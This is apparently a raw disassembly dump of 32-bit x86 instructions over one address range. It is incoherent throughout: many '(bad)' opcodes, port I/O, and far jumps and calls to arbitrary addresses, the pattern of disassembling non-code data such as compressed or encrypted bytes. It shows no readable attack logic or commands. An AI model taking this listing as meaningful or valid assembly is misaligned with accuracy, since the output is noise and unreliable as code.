  4472e8:	dec    eax
  4472e9:	lahf   
  4472ea:	jl     0x447328
  4472ec:	add    ecx,esp
  4472ee:	test   eax,0x369ddc1
  4472f3:	mov    ds:0x607d003f,al
  4472f8:	test   DWORD PTR [edi],esi
  4472fa:	(bad)  
  4472fc:	and    esi,DWORD PTR [esp+ebp*4-0x4f25c4aa]
  447303:	adc    eax,0x19a0613d
  447308:	jge    0x447298
  44730a:	out    dx,eax
  44730b:	test   DWORD PTR [eax+0x355a1d21],eax
  447311:	loop   0x447347
  447313:	mov    dl,0x1d
  447315:	adc    DWORD PTR [ebx],0xfffffff4
  447318:	stos   DWORD PTR es:[edi],eax
  447319:	push   ecx
  44731a:	inc    edx
  44731b:	jmp    0x4e988d14
  447320:	(bad)  
  447321:	mov    esp,0xe747e809
  447326:	std    
  447327:	pop    esp
  447328:	jns    0x44735c
  44732a:	dec    esi
  44732b:	sahf   
  44732c:	into   
  44732d:	call   0x62b5:0xc3466d5f
  447334:	dec    edx
  447335:	pop    ds
  447336:	stc    
  447337:	sbb    al,0x83
  447339:	push   ebx
  44733a:	xchg   esp,eax
  44733b:	sbb    al,0x3a
  44733d:	fmul   QWORD PTR [ebx]
  44733f:	sbb    BYTE PTR [esi+0x59ddc4fa],al
  447345:	pop    eax
  447346:	jg     0x4472db
  447348:	popa   
  447349:	fsubr  QWORD PTR [eax-0x3]
  44734c:	pop    ds
  44734d:	cdq    
  44734e:	cmp    al,BYTE PTR [ebp+eax*2-0x4e212ac8]
  447355:	cwde   
  447356:	or     DWORD PTR [esi-0x1a1d24ba],0x59
  44735d:	push   esp
  44735e:	repnz inc ecx
  447360:	sar    DWORD PTR [ebp+ebx*1+0x5708e0e3],0xac
  447368:	loope  0x447328
  44736a:	jb     0x447347
  44736c:	inc    esp
  44736d:	mov    cs:0x5881004a,al
  447373:	jp     0x447393
  447375:	jae    0x447359
  447377:	mov    ds:0x7a104f64,eax
  44737c:	inc    eax
  44737d:	mov    ds:0x337521a9,eax
  447382:	aad    0x91
  447384:	add    eax,0x35a2bcc5
  447389:	push   esp
  44738a:	imul   esp,DWORD PTR [ebp+0x624f2165],0x32
  447391:	xchg   ebp,eax
  447392:	jmp    0xf41e73b4
  447397:	ins    DWORD PTR es:[edi],dx
  447398:	jp     0x447324
  44739a:	sub    DWORD PTR [ebx],eax
  44739c:	sbb    BYTE PTR [ebx],ch
  44739e:	sub    BYTE PTR [ebp+0x37],cl
  4473a1:	dec    ebx
  4473a2:	push   esi
  4473a3:	dec    DWORD PTR [edx+0x14]
  4473a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4473a7:	aad    0x6a
  4473a9:	mov    ebx,0x607af438
  4473ae:	jge    0x447334
  4473b0:	int3   
  4473b1:	inc    eax
  4473b2:	clc    
  4473b3:	fldcw  WORD PTR [eax+0xd148c3e]
  4473b9:	sub    ecx,DWORD PTR [esi+0x31a618b5]
  4473bf:	cmp    DWORD PTR [edi-0x258f7b2c],0xffffff9f
  4473c6:	xor    bh,BYTE PTR [esi+0x7f9081f]
  4473cc:	cdq    
  4473cd:	scas   al,BYTE PTR es:[edi]
  4473ce:	test   DWORD PTR [ecx-0x54],ebx
  4473d1:	scas   eax,DWORD PTR es:[edi]
  4473d2:	jl     0x4473bf
  4473d4:	inc    edi
  4473d5:	pop    ebx
  4473d6:	and    bl,BYTE PTR [ebx-0x1542ec52]
  4473dc:	pop    eax
  4473dd:	mov    ecx,0xe37ffdb9
  4473e2:	and    BYTE PTR [ebp-0x2bda58d7],bh
  4473e8:	fdiv   QWORD PTR [edx+0x54c75d8]
  4473ee:	inc    edx
  4473ef:	sahf   
  4473f0:	sbb    al,0xd6
  4473f2:	fisubr WORD PTR ss:[ecx+0x49399b44]
  4473f9:	aad    0xec
  4473fb:	push   cs
  4473fc:	xchg   ebx,eax
  4473fd:	jbe    0x44738e
  4473ff:	bound  esi,QWORD PTR [ebx]
  447401:	rcl    DWORD PTR [ebp-0x5bb2c199],1
  447407:	sbb    BYTE PTR [edi],cl
  447409:	ret    0xd931
  44740c:	imul   ecx,ebp,0x57c80bf0
  447412:	iret   
  447413:	push   ebp
  447414:	fnstsw WORD PTR [ecx-0x359885f6]
  44741a:	(bad)  
  44741b:	imul   BYTE PTR [ebx+0x68a0d40f]
  447421:	js     0x44746f
  447423:	fdivr  DWORD PTR [eax-0x7592172f]
  447429:	lahf   
  44742a:	add    DWORD PTR [eax],ebp
  44742c:	mov    esi,0xa5fed8b9
  447431:	test   al,0x9d
  447433:	ins    DWORD PTR es:[edi],dx
  447434:	dec    esp
  447435:	call   0xaf364212
  44743a:	es adc esp,edi
  44743d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44743e:	retf   
  44743f:	push   ecx
  447440:	retf   
  447441:	mov    dl,0xb7
  447443:	fcom   DWORD PTR [ebp-0x49696803]
  447449:	pop    ebx
  44744a:	stc    
  44744b:	jg     0x4473d4
  44744d:	sub    DWORD PTR [esi+eiz*1],edx
  447450:	push   edi
  447451:	jne    0x44742e
  447453:	xchg   DWORD PTR [esi+edi*4+0x67ef8525],eax
  44745a:	cmc    
  44745b:	cmp    esp,DWORD PTR [esi-0x2e6e969f]
  447461:	mov    WORD PTR [esi+eax*8+0x2c],?
  447465:	push   edx
  447466:	popf   
  447467:	repnz sar BYTE PTR [esi],1
  44746a:	pop    esi
  44746b:	adc    eax,0x8b42dbf6
  447470:	fs ja  0x447481
  447473:	add    al,0xb5
  447475:	retf   
  447476:	ss (bad) 
  447478:	stc    
  447479:	mov    al,0x90
  44747b:	sbb    DWORD PTR [ebx-0x23172e77],ecx
  447481:	xabort 0xb6
  447484:	es push ebx
  447486:	adc    ecx,DWORD PTR [ecx]
  447488:	sbb    al,0x39
  44748a:	sbb    BYTE PTR [ebx+0x7dd5eb02],dh
  447490:	inc    ebx
  447491:	cmp    eax,DWORD PTR [ebp+esi*8+0x42]
  447495:	xchg   ebx,eax
  447496:	xor    BYTE PTR es:[esi],al
  447499:	sub    BYTE PTR [ecx],cl
  44749b:	pop    ebp
  44749c:	call   0x56f93b6a
  4474a1:	in     eax,dx
  4474a2:	mov    ebp,?
  4474a4:	pop    esi
  4474a5:	mov    edx,0x15b87277
  4474aa:	out    dx,al
  4474ab:	xor    ebx,0x39b338ab
  4474b1:	pop    ebx
  4474b2:	mov    ds:0xcad29545,eax
  4474b7:	or     BYTE PTR [edi-0x56faeda7],dl
  4474bd:	int    0x2f
  4474bf:	sub    al,0xb
  4474c1:	ficomp DWORD PTR [ecx]
  4474c3:	sbb    eax,0x53c4e384
  4474c8:	cs ins DWORD PTR es:[edi],dx
  4474ca:	add    bl,BYTE PTR [edi]
  4474cc:	pop    edi
  4474cd:	lods   eax,DWORD PTR ds:[esi]
  4474ce:	add    eax,0x8db55706
  4474d3:	or     al,0x9f
  4474d5:	leave  
  4474d6:	dec    ebx
  4474d7:	lahf   
  4474d8:	pop    edi
  4474d9:	jbe    0x447480
  4474db:	inc    esp
  4474dc:	push   ds
  4474dd:	hlt    
  4474de:	in     al,0x2f
  4474e0:	mov    ds:0x99bb892,al
  4474e5:	adc    al,0x26
  4474e7:	inc    edx
  4474e8:	push   edi
  4474e9:	and    eax,0x83b2d99f
  4474ee:	mov    bl,0xe5
  4474f0:	iret   
  4474f1:	push   esp
  4474f2:	push   0x24
  4474f4:	xor    eax,DWORD PTR ds:0xf31025b6
  4474fa:	call   0xfaf8:0x3cf352a
  447501:	test   ah,bl
  447503:	sub    eax,0xbb57f2ce
  447508:	bound  ebp,QWORD PTR [ebp-0x2f]
  44750b:	loop   0x44749b
  44750d:	rol    BYTE PTR [esi-0x43],0x84
  447511:	imul   edi,DWORD PTR [edx+0x39dc0744],0x1c
  447518:	pop    ebx
  447519:	add    ebx,DWORD PTR ds:0x931b0658
  44751f:	mov    es,WORD PTR [ecx]
  447521:	into   
  447522:	or     BYTE PTR [edi+0x65],bl
  447525:	mov    ch,0x49
  447527:	fistp  WORD PTR [edx+esi*4]
  44752a:	pusha  
  44752b:	and    eax,0x8603e508
  447530:	cmp    BYTE PTR [edi+eiz*8+0x222d2577],dh
  447537:	dec    ecx
  447538:	scas   al,BYTE PTR es:[edi]
  447539:	mov    eax,0x93d17779
  44753e:	(bad)
  447541:	gs xchg edx,eax
  447543:	js     0x4475af
  447545:	mov    dl,0x6f
  447547:	cmp    al,0xd0
  447549:	dec    edx
  44754a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44754b:	push   edi
  44754c:	mov    ah,0x69
  44754e:	mov    ebp,DWORD PTR [ebx]
  447550:	cmp    al,0xec
  447552:	cs hlt 
  447554:	inc    esi
  447555:	neg    BYTE PTR [ebx-0x46]
  447558:	pop    es
  447559:	test   eax,0xf78f9650
  44755e:	pop    ds
  44755f:	mov    ds:0xefed969d,eax
  447564:	inc    ebx
  447565:	dec    eax
  447566:	out    dx,eax
  447567:	iret   
  447568:	je     0x447506
  44756a:	mov    BYTE PTR [edx],dl
  44756c:	test   eax,0x882c060b
  447571:	dec    esp
  447572:	inc    edi
  447573:	adc    DWORD PTR [ebp-0x6e194f1e],0xa3c32a2b
  44757d:	or     al,0x64
  44757f:	xor    al,0xb8
  447581:	test   DWORD PTR [eax+0x1],edx
  447584:	out    dx,al
  447585:	popf   
  447586:	loopne 0x44754d
  447588:	xchg   ebp,eax
  447589:	pushf  
  44758a:	fiadd  WORD PTR [edi-0x17e3e4b9]
  447590:	push   esp
  447591:	fisttp DWORD PTR [eax+eax*8+0x6b615046]
  447598:	sbb    BYTE PTR [eax+0x45c7e56c],cl
  44759e:	imul   ecx,DWORD PTR [edi+0x65b1ea5a],0x30eb2c7e
  4475a8:	test   al,0x57
  4475aa:	mov    ecx,DWORD PTR [edi+0x54]
  4475ad:	dec    ebx
  4475ae:	int    0x37
  4475b0:	cmc    
  4475b1:	xor    eax,0x2b7bf04f
  4475b6:	leave  
  4475b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4475b8:	or     BYTE PTR [ebx+0x303ba0a4],bl
  4475be:	std    
  4475bf:	aaa    
  4475c0:	cli    
  4475c1:	das    
  4475c2:	cdq    
  4475c3:	adc    esi,DWORD PTR [eax+edi*2]
  4475c6:	stc    
  4475c7:	jno    0x4475d8
  4475c9:	outs   dx,BYTE PTR ds:[esi]
  4475ca:	jo     0x447646
  4475cc:	sub    esi,DWORD PTR [ecx-0x71]
  4475cf:	sysenter 
  4475d1:	data16 fcom DWORD PTR [edi+0x2ee6dadb]
  4475d8:	cli    
  4475d9:	imul   esi,DWORD PTR [eax+0x21],0xf38184f6
  4475e0:	fild   QWORD PTR [ecx]
  4475e2:	adc    al,0x82
  4475e4:	add    dh,BYTE PTR [esi-0x3ffc6324]
  4475ea:	mov    ds,WORD PTR [eax-0x3c74439c]
  4475f0:	xlat   BYTE PTR ds:[ebx]
  4475f1:	mov    esi,0xa0a9c362
  4475f6:	scas   al,BYTE PTR es:[edi]
  4475f7:	sbb    eax,0xf61784d8
  4475fc:	cmp    ebx,DWORD PTR [esi+0x1c]
  4475ff:	jne    0x4475f2
  447601:	push   ss
  447602:	push   eax
  447603:	or     bl,dh
  447605:	inc    eax
  447606:	clc    
  447607:	sub    ah,ah
  447609:	fs js  0x4475d6
  44760c:	adc    ah,bh
  44760e:	xchg   edi,eax
  44760f:	push   esp
  447610:	in     eax,0x93
  447612:	and    BYTE PTR [eax+0x49],bl
  447615:	mov    WORD PTR [edi-0xf3db6ba],ds
  44761b:	cmc    
  44761c:	(bad)  
  44761d:	outs   dx,BYTE PTR ds:[esi]
  44761e:	xor    ebp,DWORD PTR [esi-0x1cc49c47]
  447624:	push   edx
  447625:	test   cl,bh
  447627:	jb     0x447681
  447629:	test   al,0x33
  44762b:	add    eax,0xc0dd705d
  447630:	pop    ecx
  447631:	add    al,0x1d
  447633:	push   0x2a4bcdb9
  447638:	mov    WORD PTR [edi+0x45266429],?
  44763e:	aaa    
  44763f:	std    
  447640:	stos   DWORD PTR es:[edi],eax
  447641:	sbb    dl,bh
  447643:	adc    eax,0xd6a9c084
  447648:	pop    ebx
  447649:	dec    edi
  44764a:	js     0x4476a0
  44764c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44764d:	loopne 0x4476cc
  44764f:	aam    0x7d
  447651:	out    dx,eax
  447652:	fld    DWORD PTR [ebx+ecx*8-0xd]
  447656:	jns    0x4476a4
  447658:	ret    0x24f
  44765b:	iret   
  44765c:	push   esi
  44765d:	jmp    0xfa0cb9d3
  447662:	xchg   BYTE PTR [ebp-0x75],al
  447665:	je     0x447695
  447667:	pop    edi
  447668:	mul    DWORD PTR [esi-0x5]
  44766b:	or     DWORD PTR [eax-0x65],ebp
  44766e:	aad    0xa0
  447670:	or     eax,0x78849ee4
  447675:	add    DWORD PTR [ecx+0x28],ebx
  447678:	and    BYTE PTR [eax+0x29],0x3d
  44767c:	das    
  44767d:	mov    dl,0xa2
  44767f:	push   cs
  447680:	mov    ds:0x2bc696a1,eax
  447685:	mov    bl,0x16
  447687:	or     eax,0x331999a1
  44768c:	xor    bh,BYTE PTR [ecx]
  44768e:	std    
  44768f:	sbb    eax,esp
  447691:	(bad)  
  447692:	fldenv [esi+0x22e5482e]
  447698:	sbb    al,0x21
  44769a:	into   
  44769b:	pop    esi
  44769c:	hlt    
  44769d:	(bad)  
  44769e:	dec    edi
  44769f:	out    dx,eax
  4476a0:	mov    ebp,0xc1b5d62d
  4476a5:	add    BYTE PTR [edx-0x15],al
  4476a8:	jne    0x44767b
  4476aa:	(bad)  
  4476ab:	add    DWORD PTR [eax+0x74],edi
  4476ae:	xor    ah,BYTE PTR [edi+ebp*2+0x111830eb]
  4476b5:	sub    ah,bh
  4476b7:	fmul   QWORD PTR [ebp-0x3f68bf87]
  4476bd:	xchg   edi,esi
  4476bf:	ret    
  4476c0:	loope  0x4476b6
  4476c2:	pop    ds
  4476c3:	push   edx
  4476c4:	adc    bh,BYTE PTR ds:0xccbcf83
  4476ca:	ds popa 
  4476cc:	ds scas eax,DWORD PTR es:[edi]
  4476ce:	jae    0x447703
  4476d0:	sbb    edi,esi
  4476d2:	sbb    ebp,DWORD PTR [esi+0x35]
  4476d5:	retf   0x8168
  4476d8:	xchg   ebx,eax
  4476d9:	dec    eax
  4476da:	xor    dh,cl
  4476dc:	mov    bh,0x52
  4476de:	add    eax,0x3ccff05e
  4476e3:	loopne 0x447683
  4476e5:	sub    bl,dh
  4476e7:	xchg   ebx,eax
  4476e8:	es das 
  4476ea:	sub    BYTE PTR [ecx-0x57],al
  4476ed:	mov    cl,BYTE PTR [ebx-0x1c]
  4476f0:	adc    DWORD PTR [edx],esp
  4476f2:	mov    bh,0xea
  4476f4:	mov    ah,0xb9
  4476f6:	adc    eax,DWORD PTR ds:0xc3a6bb68
  4476fc:	jae    0x4476f6
  4476fe:	inc    ebp
  4476ff:	pop    ebx
  447700:	repz inc esp
  447702:	mov    eax,ds:0x58dc9ffe
  447707:	pop    edx
  447708:	adc    ebx,eax
  44770a:	xlat   BYTE PTR ds:[ebx]
  44770b:	rcl    DWORD PTR [edi+0x3],0x3d
  44770f:	dec    edx
  447710:	cmc    
  447711:	xchg   esp,eax
  447712:	xor    eax,0x782dc107
  447717:	call   FWORD PTR [esi]
  447719:	(bad)  
  44771a:	jnp    0x447744
  44771c:	and    edi,esi
  44771e:	sahf   
  44771f:	sub    BYTE PTR [ecx-0x3f],0x27
  447723:	xchg   ebp,eax
  447724:	jp     0x4476ad
  447726:	mov    dl,0xce
  447728:	into   
  447729:	jecxz  0x447777
  44772b:	push   es
  44772c:	cli    
  44772d:	ret    
  44772e:	xchg   bh,ah
  447730:	out    0x48,eax
  447732:	je     0x44774f
  447734:	lock xchg esp,eax
  447736:	sub    DWORD PTR [eax],edx
  447738:	mov    cl,0x72
  44773a:	dec    ebx
  44773b:	add    DWORD PTR [edi-0x16c0075a],ecx
  447741:	push   esi
  447742:	sbb    edx,DWORD PTR [edi-0x59f2d7f3]
  447748:	dec    edx
  447749:	jmp    0x3e1f:0x5d2c7d39
  447750:	jne    0x4476f8
  447752:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447753:	test   eax,0x4e4f6204
  447758:	sbb    dl,cl
  44775a:	test   BYTE PTR [edx],dh
  44775c:	das    
  44775d:	stos   DWORD PTR es:[edi],eax
  44775e:	in     al,0x63
  447760:	aad    0x70
  447762:	cdq    
  447763:	sub    BYTE PTR [ebx],al
  447765:	add    eax,0x3bacd706
  44776a:	pop    ds
  44776b:	mov    al,ds:0x3037e343
  447770:	dec    ebx
  447771:	pop    edx
  447772:	jle    0x447774
  447774:	jns    0x447780
  447776:	cmc    
  447777:	sahf   
  447778:	mov    eax,ds:0x67aa6b2a
  44777d:	mov    BYTE PTR [esi],bh
  44777f:	dec    edi
  447780:	push   cs
  447781:	dec    edx
  447782:	cli    
  447783:	int    0x67
  447785:	sbb    DWORD PTR [ebx+0x22e1bb82],eax
  44778b:	cmp    dl,bh
  44778d:	and    ah,BYTE PTR [eax-0x1b6095eb]
  447793:	sar    eax,cl
  447795:	cs rol dl,1
  447798:	xchg   esp,eax
  447799:	add    DWORD PTR [ebx],esp
  44779b:	mov    eax,0xe00652a8
  4477a0:	xchg   edx,eax
  4477a1:	adc    bl,BYTE PTR [eax+0x1a]
  4477a4:	fisub  WORD PTR [eax]
  4477a6:	test   eax,0x4d9120a2
  4477ab:	out    dx,al
  4477ac:	out    0xf6,eax
  4477ae:	dec    esi
  4477af:	pop    esp
  4477b0:	xchg   esp,esi
  4477b2:	int3   
  4477b3:	pop    ecx
  4477b4:	sar    esp,1
  4477b6:	and    al,0xc
  4477b8:	pop    ecx
  4477b9:	sub    ebx,edi
  4477bb:	jl     0x447779
  4477bd:	repnz shl DWORD PTR [ecx-0x7],cl
  4477c1:	xchg   edi,eax
  4477c2:	sub    al,0xc7
  4477c4:	pop    ebx
  4477c5:	aad    0x2c
  4477c7:	inc    edi
  4477c8:	aam    0xaa
  4477ca:	ficom  WORD PTR [ebp+0x4f6d6b14]
  4477d0:	jns    0x4477c4
  4477d2:	jnp    0x447807
  4477d4:	int    0x54
  4477d6:	jno    0x44778d
  4477d8:	hlt    
  4477d9:	call   FWORD PTR [esi+0x2af99f62]
  4477df:	mov    bl,0x92
  4477e1:	mov    ebp,0x8c3071a8
  4477e6:	(bad)
  4477e9:	imul   ebp,DWORD PTR [ecx*8-0x64a84a98],0x5161d5ff
  4477f4:	mov    dh,0x35
  4477f6:	fadd   QWORD PTR [ecx+0x48c1dd78]
  4477fc:	mov    ah,0x6f
  4477fe:	mov    eax,ds:0xf90d028c
  447803:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447804:	fimul  DWORD PTR [edi+ebx*2-0x6234b71a]
  44780b:	and    al,0x98
  44780d:	adc    esi,DWORD PTR ds:0xc08cdd40
  447813:	lock and al,0x77
  447816:	into   
  447817:	adc    BYTE PTR ds:0xa21b0b5,0xf3
  44781e:	xor    DWORD PTR [esi+ecx*2-0x4b],ebx
  447822:	push   esi
  447823:	hlt    
  447824:	xlat   BYTE PTR ds:[ebx]
  447825:	stos   DWORD PTR es:[edi],eax
  447826:	stos   DWORD PTR es:[edi],eax
  447827:	jp     0x447834
  447829:	ficomp DWORD PTR [ebp+0x4b]
  44782c:	xchg   esp,eax
  44782d:	lds    ebp,FWORD PTR [ebp-0x5c]
  447830:	aad    0xcf
  447832:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447833:	lea    ebp,ds:0x72f3b553
  447839:	adc    eax,edx
  44783b:	pop    eax
  44783c:	mov    ecx,DWORD PTR [esi]
  44783e:	mov    al,0xa2
  447840:	sbb    ebp,DWORD PTR [ebx+0x333fa65f]
  447846:	add    al,0xec
  447848:	scas   eax,DWORD PTR es:[edi]
  447849:	add    al,0x72
  44784b:	jnp    0x4477d9
  44784d:	push   0x52
  44784f:	loope  0x4477f5
  447851:	push   ebx
  447852:	push   esp
  447853:	nop
  447854:	and    BYTE PTR [eax+edi*4+0x5f166ffc],ch
  44785b:	test   DWORD PTR [ebp-0x78],0xa6c8667f
  447862:	mov    eax,cs:0x810e971a
  447868:	jnp    0x4478b5
  44786a:	or     eax,ebp
  44786c:	sub    DWORD PTR [eax+0x7f],ebx
  44786f:	cmp    bl,BYTE PTR [edx+esi*1+0x7384cb46]
  447876:	or     eax,0xcb18b67c
  44787b:	fstp   QWORD PTR [edx+0x1adf0485]
  447881:	mov    al,ah
  447883:	fild   WORD PTR [esi+0x52]
  447886:	pop    ebx
  447887:	mov    bh,0xf7
  447889:	add    BYTE PTR [esi+esi*4],bl
  44788c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44788d:	std    
  44788e:	imul   edx,ebx,0x15
  447891:	imul   esi,edi,0x2e
  447894:	sbb    al,0x85
  447896:	fmul   DWORD PTR [ebp+0x5dd3102d]
  44789c:	ins    DWORD PTR es:[edi],dx
  44789d:	(bad)
  4478a0:	pushf  
  4478a1:	mov    esp,0xa6e7da
  4478a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4478a7:	xchg   DWORD PTR [edi+0x52a040b4],eax
  4478ad:	xchg   esi,eax
  4478ae:	int3   
  4478af:	sbb    edx,DWORD PTR [eax+0x1a]
  4478b2:	dec    ecx
  4478b3:	sti    
  4478b4:	dec    ebx
  4478b5:	jb     0x447864
  4478b7:	scas   eax,DWORD PTR es:[di]
  4478b9:	out    0xe7,al
  4478bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4478bc:	pop    ecx
  4478bd:	(bad)  [esi-0x67]
  4478c0:	dec    eax
  4478c1:	adc    eax,0x7f7a473c
  4478c6:	xor    DWORD PTR [ecx],esp
  4478c8:	jle    0x4478eb
  4478ca:	imul   DWORD PTR [edi+esi*4]
  4478cd:	pop    ss
  4478ce:	sbb    dh,BYTE PTR [edx+0x5d29512e]
  4478d4:	clc    
  4478d5:	aaa    
  4478d6:	xor    BYTE PTR [ecx-0x61],ah
  4478d9:	pop    ds
  4478da:	xor    al,0xa6
  4478dc:	sbb    al,0x24
  4478de:	inc    ebp
  4478df:	mov    BYTE PTR [eax],bl
  4478e1:	xchg   ebx,eax
  4478e2:	xlat   BYTE PTR ds:[ebx]
  4478e3:	cmp    ch,bh
  4478e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4478e6:	popa   
  4478e7:	pop    eax
  4478e8:	leave  
  4478e9:	(bad)  
  4478eb:	adc    edx,ebp
  4478ed:	stos   DWORD PTR es:[edi],eax
  4478ee:	sbb    ebx,DWORD PTR [edi]
  4478f0:	loope  0x4478ba
  4478f2:	fnsave [eax-0x50ee5b53]
  4478f8:	imul   eax,DWORD PTR [eax],0x13
  4478fb:	mov    esp,0xcc4c37c1
  447900:	sub    esp,edi
  447902:	clc    
  447903:	cmp    DWORD PTR [ebx],esi
  447905:	ins    BYTE PTR es:[edi],dx
  447906:	jo     0x4478a4
  447908:	mov    BYTE PTR [eax+ebp*8+0x66f17056],dl
  44790f:	in     al,dx
  447910:	(bad)  
  447912:	mov    al,0x13
  447914:	outs   dx,BYTE PTR ds:[esi]
  447915:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447916:	mov    WORD PTR [ecx-0x239a73ff],?
  44791c:	dec    ebx
  44791d:	jns    0x447925
  44791f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447920:	dec    esi
  447921:	dec    edi
  447922:	fild   QWORD PTR [eax]
  447924:	adc    ebp,DWORD PTR [esi-0x45]
  447927:	shl    DWORD PTR [edi],cl
  447929:	mov    BYTE PTR [esi-0x4dcb5106],ah
  44792f:	hlt    
  447930:	test   al,0xee
  447932:	xor    bh,al
  447934:	cdq    
  447935:	mov    edi,0xf0b1dc1e
  44793a:	push   0xe9d718a7
  44793f:	cmp    DWORD PTR [ebx+0x6ecd359d],0x5c5b238b
  447949:	cmp    al,BYTE PTR [ebp+0x24]
  44794c:	imul   ebp,DWORD PTR [edx-0x41],0x6d621dfe
  447953:	inc    ecx
  447954:	mov    al,BYTE PTR [edi+0x4b8b1d49]
  44795a:	std    
  44795b:	sub    al,0x74
  44795d:	sti    
  44795e:	pop    ebx
  44795f:	out    dx,al
  447960:	arpl   WORD PTR [ebp+0x6f87a507],dx
  447966:	xchg   edx,eax
  447967:	xchg   ecx,eax
  447968:	call   0x7bd15eca
  44796d:	and    DWORD PTR [ecx+0x28b92204],edi
  447973:	cld    
  447974:	pusha  
  447975:	mov    ah,0x99
  447977:	fdivp  st(2),st
  447979:	clc    
  44797a:	nop
  44797b:	sub    BYTE PTR [edx-0x2048580e],ah
  447981:	je     0x447926
  447983:	adc    DWORD PTR [eax-0x57],ebp
  447986:	or     BYTE PTR [ebx+0x5f8b9311],ch
  44798c:	xchg   DWORD PTR [ecx-0x56eecf33],edx
  447992:	add    eax,0xfdae4120
  447997:	push   ecx
  447998:	xlat   BYTE PTR ds:[ebx]
  447999:	pop    edx
  44799a:	sub    DWORD PTR fs:[edx],eax
  44799d:	cmp    eax,DWORD PTR [ebp-0x574288d1]
  4479a3:	or     DWORD PTR [edi],0xe78eb2b5
  4479a9:	mov    eax,0x35e3e5a4
  4479ae:	push   ss
  4479af:	(bad)  
  4479b0:	(bad)  
  4479b1:	mov    bl,0x6e
  4479b3:	cmp    eax,0x3c6cffec
  4479b8:	push   ds
  4479b9:	inc    ebx
  4479ba:	fadd   DWORD PTR [ebx]
  4479bc:	cmp    eax,0xc91d64e8
  4479c1:	or     al,0x9b
  4479c3:	(bad)  
  4479c4:	fnsave [ebp+0x2b]
  4479c7:	mov    ds:0x5685f5b2,al
  4479cc:	mov    ds:0x3eb30134,eax
  4479d1:	sub    ebx,esi
  4479d3:	jnp    0x447a14
  4479d5:	mov    edx,DWORD PTR [ebp-0x7f]
  4479d8:	in     eax,0x76
  4479da:	test   edi,0xcdf22e
  4479e0:	sbb    DWORD PTR [eax-0x763e5dc8],ebx
  4479e6:	imul   edi,DWORD PTR [eax],0x10
  4479e9:	xor    esi,DWORD PTR cs:[ecx-0x38f537d1]
  4479f0:	mov    al,0xe0
  4479f2:	jne    0x4479e5
  4479f4:	mov    ch,0x8c
  4479f6:	inc    edx
  4479f7:	repz xchg esp,eax
  4479f9:	sub    al,0x5c
  4479fb:	or     DWORD PTR [ebx-0x71],esp
  4479fe:	in     al,0x6f
  447a00:	sbb    eax,0xfcf527a7
  447a05:	ins    BYTE PTR es:[edi],dx
  447a06:	int3   
  447a07:	and    BYTE PTR [eax+ebp*8+0x4df1a466],0xb0
  447a0f:	out    0xcc,al
  447a11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447a12:	mov    esi,0xf4734a74
  447a17:	cdq    
  447a18:	push   ss
  447a19:	sbb    ecx,DWORD PTR [ebx]
  447a1b:	push   ebp
  447a1c:	fs xor edx,ebx
  447a1f:	fcomp  DWORD PTR [ebp-0x3a6380e2]
  447a25:	out    dx,al
  447a26:	repnz lock xor esi,ebx
  447a2a:	push   esp
  447a2b:	hlt    
  447a2c:	neg    BYTE PTR [edx+0x41eb6ac3]
  447a32:	adc    ecx,ebp
  447a34:	aad    0x62
  447a36:	scas   eax,DWORD PTR es:[edi]
  447a37:	jg     0x4479e6
  447a39:	test   al,0x89
  447a3b:	jnp    0x447a50
  447a3d:	mov    ds:0x14c96ad0,al
  447a42:	pusha  
  447a43:	imul   ecx,DWORD PTR [eax-0x6165915],0x37fbe4fe
  447a4d:	sar    DWORD PTR [edi-0x3ea0e07],0xd9
  447a54:	pusha  
  447a55:	stos   BYTE PTR es:[edi],al
  447a56:	test   DWORD PTR [edi-0x30],ecx
  447a59:	mov    dl,0x28
  447a5b:	or     eax,0xd7f9496
  447a60:	icebp  
  447a61:	fistp  QWORD PTR [edx-0x648bd4a7]
  447a67:	rcr    bh,0x3f
  447a6a:	mov    dh,0x78
  447a6c:	into   
  447a6d:	cmp    al,0x44
  447a6f:	xchg   ebp,eax
  447a70:	fdiv   QWORD PTR ds:0x954d737b
  447a76:	sub    DWORD PTR [edx+ebx*8-0x46],ebx
  447a7a:	dec    ecx
  447a7b:	test   BYTE PTR [esi+eax*2+0x1f2ce75d],0x2a
  447a83:	jo     0x447a59
  447a85:	(bad)  
  447a86:	dec    ebp
  447a87:	cld    
  447a88:	xor    BYTE PTR [edi],bl
  447a8a:	jnp    0x447a6f
  447a8c:	mov    gs,WORD PTR [eax]
  447a8e:	xchg   ecx,eax
  447a8f:	dec    edx
  447a90:	test   DWORD PTR [eax],ecx
  447a92:	es dec edi
  447a94:	pop    edx
  447a95:	inc    eax
  447a96:	gs push ebx
  447a98:	in     eax,dx
  447a99:	sub    ebx,ebp
  447a9b:	test   DWORD PTR cs:[edx],esi
  447a9e:	dec    ebx
  447a9f:	les    edi,FWORD PTR [esi+ecx*8+0x66f6d924]
  447aa6:	arpl   si,bx
  447aa8:	pop    ecx
  447aa9:	jno    0x447a84
  447aab:	sub    bl,dl
  447aad:	push   eax
  447aae:	(bad)  
  447aaf:	popa   
  447ab0:	gs aam 0xb0
  447ab3:	rcr    DWORD PTR [esp+esi*4],1
  447ab6:	pop    ebp
  447ab7:	scas   al,BYTE PTR es:[edi]
  447ab8:	mov    WORD PTR [esi-0x26a7e1e1],es
  447abe:	push   0x5d
  447ac0:	mov    esp,?
  447ac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447ac3:	xchg   ebx,ecx
  447ac5:	xchg   BYTE PTR [eax-0x67c969bc],dh
  447acb:	or     DWORD PTR cs:[eax+0x60],ecx
  447acf:	test   DWORD PTR [esi+0x3b29c9f5],ecx
  447ad5:	test   al,0x92
  447ad7:	mov    ss,edi
